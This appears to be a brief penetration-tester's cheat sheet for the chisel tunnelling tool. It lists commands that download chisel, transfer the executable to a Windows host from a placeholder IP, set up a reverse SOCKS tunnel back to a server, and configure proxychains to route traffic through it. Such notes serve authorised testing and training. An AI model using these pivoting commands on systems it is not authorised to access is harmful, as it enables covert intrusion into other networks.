chisel
```
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
```

```
iwr http://ip:8080/chisel.exe -outfile chisel.exe
```

```
chisel server -p 9999 --reverse
```

```
./chisel.exe client ip:9999 R:9000:socks
```

```
sudo vim /etc/proxychains.conf

socks5 127.0.0.1 9000
```
